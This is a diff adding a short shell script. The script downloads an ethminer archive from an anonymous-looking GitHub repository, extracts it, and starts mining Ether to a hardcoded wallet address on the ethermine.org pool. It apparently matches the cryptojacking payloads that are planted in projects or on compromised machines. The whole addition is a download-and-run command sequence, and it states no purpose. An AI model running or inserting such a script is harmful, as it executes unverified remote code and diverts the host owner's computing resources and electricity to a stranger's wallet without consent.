@@ -1,0 +1,4 @@
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
+tar -xvf ./ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
+cd /./bin/
+./ethminer --pool stratum://0x3054fbE374C0b3E85c969f74318e3582E9f5eC87.linux84:@us2.ethermine.org:4444
